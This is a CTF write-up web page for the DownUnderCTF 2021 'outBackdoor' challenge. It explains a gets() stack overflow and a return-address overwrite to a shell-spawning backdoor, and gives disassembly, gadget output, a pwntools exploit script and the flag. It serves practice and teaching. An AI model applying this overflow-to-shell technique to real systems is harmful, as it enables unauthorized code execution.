@@ -1,0 +1,141 @@
+<!DOCTYPE html><html data-astro-transition-scope="astro-nfpogox7-1" lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="stylesheet" href="/fonts/maple-mono/normal-nl/regular/font.css"><link rel="stylesheet" href="/fonts/maple-mono/normal-nl/bold/font.css"><link rel="icon" href="/favicon.ico?v=2" sizes="16x16 32x32 48x48"><link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32.png?v=2"><link rel="icon" type="image/png" sizes="512x512" href="/icons/favicon.png?v=2"><link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png?v=2"><link rel="sitemap" href="/sitemap-index.xml"><link rel="alternate" type="application/rss+xml" title="Aynakeya" href="/rss.xml"><link rel="canonical" href="https://www.aynakeya.com/ctf-writeup/2021/downunderctf/ductf2021-pwn-outbackdoor/"><meta name="generator" content="Astro v7.3.3"><title>[writeup][DownUnderCTF 2021] pwn-outbackdoor | Aynakeya</title><meta name="description" content="Novel, Code, Anime. Notes and things worth keeping."><meta property="og:type" content="website"><meta property="og:title" content="[writeup][DownUnderCTF 2021] pwn-outbackdoor | Aynakeya"><meta property="og:description" content="Novel, Code, Anime. Notes and things worth keeping."><meta property="og:url" content="https://www.aynakeya.com/ctf-writeup/2021/downunderctf/ductf2021-pwn-outbackdoor/"><meta property="og:image" content="https://www.aynakeya.com/images/avatar.jpg"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="[writeup][DownUnderCTF 2021] pwn-outbackdoor | Aynakeya"><meta name="twitter:description" content="Novel, Code, Anime. Notes and things worth keeping."><meta name="twitter:image" content="https://www.aynakeya.com/images/avatar.jpg"><script>
+  (() => {
+    function applyTheme() {
+      const savedTheme = localStorage.getItem('theme');
+      const themePreference = savedTheme === 'light' || savedTheme === 'dark' ? savedTheme : 'system';
+      document.documentElement.dataset.themePreference = themePreference;
+      document.documentElement.dataset.theme = themePreference === 'system'
+        ? (matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light')
+        : themePreference;
+    }
+    applyTheme();
+    document.addEventListener('astro:after-swap', applyTheme);
+  })();
+</script><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="swap"><script type="module" src="/_astro/ClientRouter.astro_astro_type_script_index_0_lang.CYDbzu1r.js"></script><link rel="stylesheet" href="/_astro/BaseLayout.CjWOxd-i.css"><link rel="stylesheet" href="/_astro/katex.DM9nOOGm.css"><style>.ctf-year{margin-bottom:24px}.ctf-year-title{align-items:baseline;gap:18px;margin:0 0 14px;padding:14px 24px;font-size:23px;display:flex}.ctf-year-title span{color:var(--muted);font-size:13px;font-weight:400}.ctf-events{grid-template-columns:repeat(2,minmax(0,1fr));gap:14px;display:grid}.ctf-event{flex-direction:column;justify-content:space-between;gap:20px;display:flex}.ctf-event h3{margin:0;font-size:19px}.ctf-event>div{color:var(--muted);justify-content:space-between;align-items:center;font-size:13px;display:flex}.ctf-event:hover{border-color:var(--accent)}.ctf-event:hover .icon{color:var(--accent)}.ctf-related h2{margin-bottom:16px;font-size:19px}.ctf-related>a{justify-content:space-between;gap:16px;padding:8px 0;font-size:15px;display:flex}.ctf-breadcrumbs,.ctf-meta{color:var(--muted);flex-wrap:wrap;align-items:center;gap:8px 14px;font-size:13px;display:flex}.ctf-breadcrumbs>span{color:var(--line)}.ctf-meta>a{color:var(--accent);margin-left:auto}.ctf-writeups,.ctf-back{max-width:1080px;margin:32px auto 0}.ctf-writeups>h2{align-items:center;gap:12px;font-size:23px;display:flex}.ctf-group{margin-top:24px}.ctf-group h3{color:var(--accent);background:var(--soft);border-radius:4px;margin:0;padding:8px 14px;font-size:14px}.ctf-group ul{margin:0;padding:0;list-style:none}.ctf-group a{border-bottom:1px solid var(--line);justify-content:space-between;align-items:center;gap:16px;padding:16px 14px;font-size:16px;display:flex}.ctf-group .icon{color:var(--muted)}.ctf-back{border-top:1px solid var(--line);color:var(--accent);padding-top:24px;font-size:14px}@media (width<=620px){.ctf-events{grid-template-columns:1fr}.ctf-event{gap:14px}.ctf-group a{padding-inline:0;font-size:15px}}
+</style><style>[data-astro-transition-scope="astro-nfpogox7-1"] { view-transition-name: astro-nfpogox7-1; }@layer astro { ::view-transition-old(astro-nfpogox7-1) { animation: none; opacity: 0; mix-blend-mode: normal; }::view-transition-new(astro-nfpogox7-1) { animation: none; mix-blend-mode: normal; }::view-transition-group(astro-nfpogox7-1) { animation: none } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-nfpogox7-1"] { animation: none; mix-blend-mode: normal; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-nfpogox7-1"] { animation: none; mix-blend-mode: normal; }</style></head><body id="top"><a class="skip-link" href="#content">Skip to content</a><header class="site-header"><div class="header-inner"><a class="brand" href="/" aria-label="Aynakeya home"><img src="/icons/favicon.png" alt="" width="32" height="32"><span>Aynakeya</span></a><nav class="site-nav" aria-label="Main navigation"><a href="/"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m3 10 9-7 9 7M5 9v11h5v-6h4v6h5V9"></path></svg><span>Home</span></a><a href="/blog/"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M14 4H5v16h14v-9M9 15l1-4L19 2l3 3-9 9-4 1Z"></path></svg><span>Writing</span></a><a href="/bookmarks/"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 3h12v18l-6-4-6 4V3Z"></path></svg><span>Bookmarks</span></a><a href="/ctf-writeup/" aria-current="page"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 3h18v5H3V3ZM5 8v13h14V8M10 12h4"></path></svg><span>CTF</span></a></nav><div class="header-tools"><a class="icon-button" href="/search/" aria-label="搜索文章与 CTF 归档" title="搜索文章与 CTF 归档"><svg class="icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 21l-5-5M18 10a8 8 0 1 1-16 0 8 8 0 0 1 16 0Z"></path></svg></a><button class="icon-button" id="theme-toggle" type="button" aria-label="当前：跟随系统；切换到浅色模式" title="当前：跟随系统；切换到浅色模式"><span data-theme-icon="light" hidden><svg class="icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 2v2m0 16v2M2 12h2m16 0h2M5 5l1.5 1.5m11 11L19 19M5 19l1.5-1.5m11-11L19 5M17 12a5 5 0 1 1-10 0 5 5 0 0 1 10 0Z"></path></svg></span><span data-theme-icon="dark" hidden><svg class="icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20.9 13A9 9 0 0 1 11 3.1 9 9 0 1 0 20.9 13Z"></path></svg></span><span data-theme-icon="system"><svg class="icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 4h18v13H3V4ZM12 17v4M8 21h8"></path></svg></span></button></div></div></header><script type="module">var e=document.documentElement,t=matchMedia(`(prefers-color-scheme: dark)`),n={light:{label:`浅色模式`,next:`dark`},dark:{label:`深色模式`,next:`system`},system:{label:`跟随系统`,next:`light`}};function r(){let r=e.dataset.themePreference;e.dataset.theme=r===`system`?t.matches?`dark`:`light`:r;let i=document.querySelector(`#theme-toggle`),a=i.querySelectorAll(`[data-theme-icon]`),o=n[r],s=`当前：${o.label}；切换到${n[o.next].label}`;i.setAttribute(`aria-label`,s),i.title=s,a.forEach(e=>{e.hidden=e.dataset.themeIcon!==r})}r(),document.addEventListener(`astro:after-swap`,r),document.addEventListener(`click`,t=>{if(!(t.target instanceof Element)||!t.target.closest(`#theme-toggle`))return;let i=n[e.dataset.themePreference].next;e.dataset.themePreference=i,localStorage.setItem(`theme`,i),r()}),t.addEventListener(`change`,()=>{e.dataset.themePreference===`system`&&r()});</script><div class="site-shell"><aside class="site-sidebar" aria-label="个人信息与文章目录"><section class="profile-card panel" aria-label="About Aynakeya"><a class="profile-avatar" href="/" aria-label="Aynakeya home"><img src="/images/avatar.jpg" alt="Aynakeya 的头像" width="208" height="208"></a><div class="profile-identity"><p class="profile-name">Aynakeya</p><p class="profile-interests">相信的心就是你的魔法</p><div class="social-links"><a href="https://github.com/aynakeya">GitHub</a><a href="mailto:aynakeya.official@gmail.com">Email</a><a href="https://space.bilibili.com/10003632">Bilibili</a></div></div><div class="site-stats"><a href="/blog/archives/"><strong>121</strong><span>文章</span></a><a href="/blog/categories/"><strong>16</strong><span>分类</span></a><a href="/blog/tags/"><strong>101</strong><span>标签</span></a></div></section><details class="toc" open><summary>文章目录</summary><nav aria-label="Table of contents"><ol><li style="--depth: 0"><a href="#mitigations">Mitigations</a></li><li style="--depth: 0"><a href="#solution">Solution</a></li><li style="--depth: 1"><a href="#vuln-1">vuln 1</a></li><li style="--depth: 1"><a href="#vuln-2">vuln 2</a></li><li style="--depth: 0"><a href="#code">code</a></li><li style="--depth: 0"><a href="#exploits">exploits</a></li></ol></nav></details><script type="module">var e=matchMedia(`(max-width: 800px)`);function t(){let t=document.querySelector(`.toc`);t&&(t.open=!e.matches)}t(),document.addEventListener(`astro:after-swap`,t),e.addEventListener(`change`,t);</script></aside><div class="site-main"><main id="content" tabindex="-1"><article class="paper article-page ctf-page"><header class="post-header"><nav class="ctf-breadcrumbs" aria-label="Breadcrumb"><a href="/ctf-writeup/">CTF Archive</a><span>/</span><a href="/ctf-writeup/#2021">2021</a><span>/</span><a href="/ctf-writeup/2021/downunderctf/">DownUnder CTF 2021</a></nav><h1>[writeup][DownUnderCTF 2021] pwn-outbackdoor</h1><div class="ctf-meta"><span class="heading-count">历史归档</span><span>Writeups</span><a href="https://github.com/aynakeya/ctf-writeup/tree/bae056dc4e13cd8dcb3be751b53e2f7adb7fc7b9/2021/downunderctf">GitHub 附件 <svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 12h14m-6-6 6 6-6 6"></path></svg></a></div></header><div class="prose"><p><a id="Mitigations"></a></p>
+<h2 id="mitigations">Mitigations</h2>
+<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span># Arch:     amd64-64-little</span></span>
+<span class="line"><span># RELRO:    Partial RELRO</span></span>
+<span class="line"><span># Stack:    No canary found</span></span>
+<span class="line"><span># NX:       NX enabled</span></span>
+<span class="line"><span># PIE:      No PIE (0x400000)</span></span></code></pre>
+<p><a id="Solution"></a></p>
+<h2 id="solution">Solution</h2>
+<h3 id="vuln-1">vuln 1</h3>
+<p>there is a backdoor function called <code>outBackdoor</code> in the function, which give as a shell.</p>
+<p><img alt="stack" loading="lazy" decoding="async" width="648" height="160" src="/_astro/2021-10-09_121913.DKlT0tK4_Z1QofhT.webp"></p>
+<h3 id="vuln-2">vuln 2</h3>
+<p>the main function utilze gets, we can overwrite rip to outBackdoor which give as a shell when return.</p>
+<p>simplely write 0x10 bytes + 0x8 btyes (rbp size) + 0x004011d7 in 8 bytes to overwrite rip and get flag</p>
+<p>however, this will cause <strong>EOF error</strong></p>
+<p>this is because the stack is <strong>not aligned</strong>, we need to align the stack to 16x.</p>
+<p>since it is x64 system, each data worth 8 bytes, add a ret operation to pop 1 value stack before call the backdoor will solve this problem.</p>
+<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>$ ROPgadget --binary outBackdoor | grep ": ret"</span></span>
+<span class="line"><span>0x0000000000401016 : ret</span></span>
+<span class="line"><span>0x000000000040117a : ret 0xfffe</span></span>
+<span class="line"><span>0x0000000000401062 : retf 0x2f</span></span></code></pre>
+<p>so write x10 bytes + 0x8 btyes (rbp size) + 0x401016 + 0x004011d7 to get shell.</p>
+<h2 id="code">code</h2>
+<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>int main (int argc, char **argv, char **envp);</span></span>
+<span class="line"><span>; var char *s @ rbp-0x10</span></span>
+<span class="line"><span>0x00401195      push rbp</span></span>
+<span class="line"><span>0x00401196      mov rbp, rsp</span></span>
+<span class="line"><span>0x00401199      sub rsp, 0x10</span></span>
+<span class="line"><span>0x0040119d      mov eax, 0</span></span>
+<span class="line"><span>0x004011a2      call buffer_init   ; sym.buffer_init</span></span>
+<span class="line"><span>0x004011a7      lea rdi, str.Fool_me_once__shame_on_you._Fool_me_twice__shame_on_me. ; 0x402008 ; const char *s</span></span>
+<span class="line"><span>0x004011ae      call puts          ; sym.imp.puts ; int puts(const char *s)</span></span>
+<span class="line"><span>0x004011b3      lea rdi, str.Seriously_though__what_features_would_be_cool__Maybe_it_could_play_a_song ; 0x402048 ; const char *s</span></span>
+<span class="line"><span>0x004011ba      call puts          ; sym.imp.puts ; int puts(const char *s)</span></span>
+<span class="line"><span>0x004011bf      lea rax, [s]</span></span>
+<span class="line"><span>0x004011c3      mov rdi, rax       ; char *s</span></span>
+<span class="line"><span>0x004011c6      mov eax, 0</span></span>
+<span class="line"><span>0x004011cb      call gets          ; sym.imp.gets ; char *gets(char *s)</span></span>
+<span class="line"><span>0x004011d0      mov eax, 0</span></span>
+<span class="line"><span>0x004011d5      leave</span></span>
+<span class="line"><span>0x004011d6      ret</span></span>
+<span class="line"><span>outBackdoor ();</span></span>
+<span class="line"><span>0x004011d7      push rbp</span></span>
+<span class="line"><span>0x004011d8      mov rbp, rsp</span></span>
+<span class="line"><span>0x004011db      lea rdi, str.W...w...Wait__Who_put_this_backdoor_out_back_here ; 0x402098 ; const char *s</span></span>
+<span class="line"><span>0x004011e2      call puts          ; sym.imp.puts ; int puts(const char *s)</span></span>
+<span class="line"><span>0x004011e7      lea rdi, str.bin_sh ; 0x4020cd ; const char *string</span></span>
+<span class="line"><span>0x004011ee      mov eax, 0</span></span>
+<span class="line"><span>0x004011f3      call system        ; sym.imp.system ; int system(const char *string)</span></span>
+<span class="line"><span>0x004011f8      nop</span></span>
+<span class="line"><span>0x004011f9      pop rbp</span></span>
+<span class="line"><span>0x004011fa      ret</span></span>
+<span class="line"><span>0x004011fb      nop dword [rax + rax]</span></span></code></pre>
+<h2 id="exploits">exploits</h2>
+<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>#!/usr/bin/env python3</span></span>
+<span class="line"><span># -*- coding: utf-8 -*-</span></span>
+<span class="line"><span># This exploit template was generated via:</span></span>
+<span class="line"><span># $ pwn template '--host=pwn-2021.duc.tf' '--port=31921' outBackdoor</span></span>
+<span class="line"><span>from pwn import *</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Set up pwntools for the correct architecture</span></span>
+<span class="line"><span>exe = context.binary = ELF('outBackdoor')</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Many built-in settings can be controlled on the command-line and show up</span></span>
+<span class="line"><span># in "args".  For example, to dump all data sent/received, and disable ASLR</span></span>
+<span class="line"><span># for all created processes...</span></span>
+<span class="line"><span># ./exploit.py DEBUG NOASLR</span></span>
+<span class="line"><span># ./exploit.py GDB HOST=example.com PORT=4141</span></span>
+<span class="line"><span>host = args.HOST or 'pwn-2021.duc.tf'</span></span>
+<span class="line"><span>port = int(args.PORT or 31921)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def start_local(argv=[], *a, **kw):</span></span>
+<span class="line"><span>    '''Execute the target binary locally'''</span></span>
+<span class="line"><span>    if args.GDB:</span></span>
+<span class="line"><span>        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span></span>
+<span class="line"><span>    else:</span></span>
+<span class="line"><span>        return process([exe.path] + argv, *a, **kw)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def start_remote(argv=[], *a, **kw):</span></span>
+<span class="line"><span>    '''Connect to the process on the remote host'''</span></span>
+<span class="line"><span>    io = connect(host, port)</span></span>
+<span class="line"><span>    if args.GDB:</span></span>
+<span class="line"><span>        gdb.attach(io, gdbscript=gdbscript)</span></span>
+<span class="line"><span>    return io</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def start(argv=[], *a, **kw):</span></span>
+<span class="line"><span>    '''Start the exploit against the target.'''</span></span>
+<span class="line"><span>    if args.LOCAL:</span></span>
+<span class="line"><span>        return start_local(argv, *a, **kw)</span></span>
+<span class="line"><span>    else:</span></span>
+<span class="line"><span>        return start_remote(argv, *a, **kw)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Specify your GDB script here for debugging</span></span>
+<span class="line"><span># GDB will be launched if the exploit is run via e.g.</span></span>
+<span class="line"><span># ./exploit.py GDB</span></span>
+<span class="line"><span>gdbscript = '''</span></span>
+<span class="line"><span>tbreak main</span></span>
+<span class="line"><span>continue</span></span>
+<span class="line"><span>'''.format(**locals())</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>#===========================================================</span></span>
+<span class="line"><span>#                    EXPLOIT GOES HERE</span></span>
+<span class="line"><span>#===========================================================</span></span>
+<span class="line"><span># Arch:     amd64-64-little</span></span>
+<span class="line"><span># RELRO:    Partial RELRO</span></span>
+<span class="line"><span># Stack:    No canary found</span></span>
+<span class="line"><span># NX:       NX enabled</span></span>
+<span class="line"><span># PIE:      No PIE (0x400000)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>io = start()</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># shellcode = asm(shellcraft.sh())</span></span>
+<span class="line"><span># payload = fit({</span></span>
+<span class="line"><span>#     32: 0xdeadbeef,</span></span>
+<span class="line"><span>#     'iaaa': [1, 2, 'Hello', 3]</span></span>
+<span class="line"><span># }, length=128)</span></span>
+<span class="line"><span># io.send(payload)</span></span>
+<span class="line"><span># flag = io.recv(...)</span></span>
+<span class="line"><span># log.success(flag)</span></span>
+<span class="line"><span>import os</span></span>
+<span class="line"><span>print(io.recv(1024))</span></span>
+<span class="line"><span>io.send(os.urandom(0x10+0x8)+(0x401016).to_bytes(0x8,"little")+(0x004011d7).to_bytes(0x8,"little"))</span></span>
+<span class="line"><span>io.interactive()</span></span></code></pre>
+<p>DUCTF{<a href="https://www.youtube.com/watch?v=XfR9iY5y94s%7D">https://www.youtube.com/watch?v=XfR9iY5y94s}</a></p></div><footer class="ctf-back"><a href="/ctf-writeup/2021/downunderctf/">&larr; DownUnder CTF 2021</a></footer></article></main><footer class="site-footer"><span>&copy; 2026 Aynakeya</span><div><a href="/rss.xml">RSS</a><a href="/blog/archives/">Archives</a><a href="#top">Back to top &uarr;</a></div></footer></div></div></body></html>
